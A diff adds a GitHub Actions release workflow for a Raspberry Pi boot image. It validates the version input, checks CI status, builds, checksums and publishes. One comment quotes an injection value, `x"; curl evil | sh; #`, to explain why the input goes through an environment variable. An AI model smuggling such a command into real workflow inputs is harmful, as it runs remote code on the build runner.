@@ -1,0 +1,240 @@
+name: Release
+
+# Publishes the all-boards card. Manual on purpose: the version is a human
+# decision, so the person cutting the release types it in. Pick the branch or
+# tag to release from in the same dialog — `github.sha` follows that choice.
+#
+# The gate that a `workflow_run` trigger would have given for free is enforced
+# explicitly instead: the `gate` job refuses to release a commit that CI has not
+# passed on.
+on:
+  workflow_dispatch:
+    inputs:
+      version:
+        description: 'Version to release, e.g. 2026.08.27 or 1.0.0-rc1 (a leading "v" is added if missing)'
+        required: true
+        type: string
+      prerelease:
+        description: 'Mark as a pre-release, so it is not shown as Latest'
+        required: false
+        default: false
+        type: boolean
+
+# One release at a time. Not cancel-in-progress: a half-finished publish would
+# leave a tag or a release behind with no assets on it.
+concurrency:
+  group: release
+  cancel-in-progress: false
+
+permissions:
+  contents: read
+
+jobs:
+  # -------------------------------------------------------------------------
+  # Everything that can say "no" happens here, before the multi-minute build:
+  # the version is validated, the commit is checked against CI, and the tag is
+  # checked for collisions. Cheap, and it fails in seconds rather than after a
+  # full image build.
+  # -------------------------------------------------------------------------
+  gate:
+    name: check the version and the commit
+    runs-on: ubuntu-latest
+    outputs:
+      tag: ${{ steps.version.outputs.tag }}
+      asset: ${{ steps.version.outputs.asset }}
+    steps:
+      # `inputs.version` is attacker-controlled text. It is passed through the
+      # environment rather than interpolated into the script, because `${{ }}`
+      # is substituted before bash ever sees the line — a version of
+      # `x"; curl evil | sh; #` would otherwise run.
+      - name: Validate the version
+        id: version
+        env:
+          VERSION: ${{ inputs.version }}
+        run: |
+          # Trim the ends only. Deleting all whitespace would quietly turn a
+          # fat-fingered "1.0 0" into "1.00" and release the wrong version;
+          # internal whitespace has to reach the pattern below and be rejected.
+          version="$VERSION"
+          version="${version#"${version%%[![:space:]]*}"}"
+          version="${version%"${version##*[![:space:]]}"}"
+          version="${version#v}"
+          # Must start with a digit and stay inside what git accepts as a tag
+          # and what a filename can carry: no slashes, no shell metacharacters.
+          if [[ ! "$version" =~ ^[0-9][0-9A-Za-z.+-]*$ ]]; then
+            echo "::error title=Bad version::'${VERSION}' is not a version." \
+                 "Expected something like 2026.08.27, 1.0.0 or 1.0.0-rc1," \
+                 "optionally with a leading v."
+            exit 1
+          fi
+          tag="v${version}"
+          {
+            echo "tag=${tag}"
+            echo "asset=sepiaos-boot-universal-${tag}.img.xz"
+          } >> "$GITHUB_OUTPUT"
+          echo "Releasing ${tag} from ${GITHUB_SHA}"
+
+      # A manual trigger cannot inherit "CI passed on this commit" the way an
+      # automatic one would, so it is asked for outright.
+      - name: Require a green CI run for this commit
+        env:
+          GH_TOKEN: ${{ github.token }}
+        run: |
+          runs="$(gh api \
+            "repos/${GITHUB_REPOSITORY}/actions/workflows/ci.yml/runs?head_sha=${GITHUB_SHA}&status=success" \
+            --jq '.total_count' 2>/dev/null || echo 0)"
+          if [ "${runs:-0}" -eq 0 ]; then
+            echo "::error title=No green CI run::${GITHUB_SHA} has no successful" \
+                 "CI run. Push it, wait for CI, then release — or re-run CI on it."
+            exit 1
+          fi
+          echo "CI passed on ${GITHUB_SHA} (${runs} successful run(s))"
+
+      - name: Refuse to overwrite an existing release
+        env:
+          GH_TOKEN: ${{ github.token }}
+          TAG: ${{ steps.version.outputs.tag }}
+        run: |
+          if gh release view "$TAG" --repo "$GITHUB_REPOSITORY" >/dev/null 2>&1; then
+            echo "::error title=${TAG} already released::Pick a different version," \
+                 "or delete the old release first:" \
+                 "gh release delete ${TAG} --cleanup-tag"
+            exit 1
+          fi
+          # Asked over the API, not with git ls-remote: this job has no checkout,
+          # so there is no repository for git to read an `origin` from.
+          if gh api "repos/${GITHUB_REPOSITORY}/git/ref/tags/${TAG}" >/dev/null 2>&1; then
+            echo "::error title=${TAG} already tagged::The tag exists without a" \
+                 "release. Delete it (git push --delete origin ${TAG}) or pick" \
+                 "a different version."
+            exit 1
+          fi
+
+  # -------------------------------------------------------------------------
+  # Built in the same container CI verified in. mtools decides the FAT layout,
+  # so building the shipped image on a different distribution would ship an
+  # image that is not the one the boot checks passed on.
+  # -------------------------------------------------------------------------
+  build:
+    name: build the universal card
+    needs: gate
+    runs-on: ubuntu-latest
+    container: debian:trixie-slim
+    outputs:
+      firmware: ${{ steps.firmware.outputs.firmware }}
+    steps:
+      # Before checkout on purpose: without git in the container, actions/checkout
+      # silently falls back to downloading a tarball, and the Makefile needs git
+      # for the sparse overlays clone.
+      - name: Install build tools
+        run: |
+          apt-get update -qq
+          apt-get install -y -qq --no-install-recommends \
+            make mtools git curl ca-certificates bsdextrautils xz-utils
+
+      - uses: actions/checkout@v4
+
+      - name: Read the pinned firmware tag
+        id: firmware
+        run: echo "firmware=$(make -s print-FIRMWARE_TAG)" >> "$GITHUB_OUTPUT"
+
+      - name: Build the image
+        run: make BOARD=universal image
+
+      # The manifest in checksums/ covers exactly the universal artifact set,
+      # so nothing ships until every downloaded blob matches what was pinned.
+      - name: Check downloads against the pinned manifest
+        run: make BOARD=universal verify-firmware
+
+      - name: List what ended up on the partition
+        run: make BOARD=universal verify
+
+      # -T0 uses every core; the checksum is taken afterwards, so the threaded
+      # encoder's different framing does not matter.
+      - name: Compress and checksum
+        env:
+          ASSET: ${{ needs.gate.outputs.asset }}
+        run: |
+          mkdir -p dist
+          xz -9 -T0 -c "$(make -s BOARD=universal print-IMAGE)" > "dist/${ASSET}"
+          cd dist && sha256sum "${ASSET}" > SHA256SUMS
+          cat SHA256SUMS
+
+      # compression-level 0: the payload is already xz -9, so zipping it again
+      # only burns CPU.
+      - uses: actions/upload-artifact@v4
+        with:
+          name: release-assets
+          path: dist/
+          compression-level: 0
+          if-no-files-found: error
+
+  # -------------------------------------------------------------------------
+  # Publishing is a separate job purely so it can run on the bare runner, where
+  # `gh` is preinstalled. Debian does not package the GitHub CLI, so doing this
+  # in the build container would mean either a third-party action or hand-rolled
+  # REST calls.
+  #
+  # `gh release create --target` creates the tag as part of the release, so the
+  # "tag exists but the release does not" half-state cannot happen.
+  # -------------------------------------------------------------------------
+  publish:
+    name: publish the release
+    needs: [gate, build]
+    runs-on: ubuntu-latest
+    permissions:
+      contents: write
+    steps:
+      - uses: actions/download-artifact@v4
+        with:
+          name: release-assets
+          path: dist
+
+      - name: Create the release
+        env:
+          GH_TOKEN: ${{ github.token }}
+          TAG: ${{ needs.gate.outputs.tag }}
+          ASSET: ${{ needs.gate.outputs.asset }}
+          FIRMWARE: ${{ needs.build.outputs.firmware }}
+          PRERELEASE: ${{ inputs.prerelease }}
+        run: |
+          cat > notes.md <<EOF
+          Boot partition for every supported board on one card: Pi Zero 2 W,
+          Pi 3, Pi 4, CM4, Pi 5 and CM5. The firmware picks the device tree from
+          the board it detects, so the same card boots all six.
+
+          | | |
+          |---|---|
+          | Commit | \`${GITHUB_SHA}\` |
+          | Raspberry Pi firmware | \`${FIRMWARE}\` |
+
+          This is a **boot partition only**. On its own it takes the kernel as
+          far as \`VFS: Unable to mount root fs\` — that is the expected end
+          state until a root filesystem is written to partition 2.
+
+          Verify the download, then flash it — on Linux:
+
+          \`\`\`sh
+          sha256sum -c SHA256SUMS
+          xz -d ${ASSET}
+          sudo dd if=${ASSET%.xz} of=/dev/sdX bs=4M conv=fsync status=progress
+          \`\`\`
+
+          On macOS the device is \`/dev/rdiskN\` and the block size is spelled
+          \`bs=4m\`; \`shasum -a 256 -c SHA256SUMS\` replaces \`sha256sum\`.
+          EOF
+
+          if [ "$PRERELEASE" = "true" ]; then
+            flag=(--prerelease)
+          else
+            flag=(--latest)
+          fi
+
+          gh release create "$TAG" \
+            --repo "$GITHUB_REPOSITORY" \
+            --target "$GITHUB_SHA" \
+            --title "SepiaOS boot $TAG" \
+            --notes-file notes.md \
+            "${flag[@]}" \
+            "dist/$ASSET" \
+            dist/SHA256SUMS
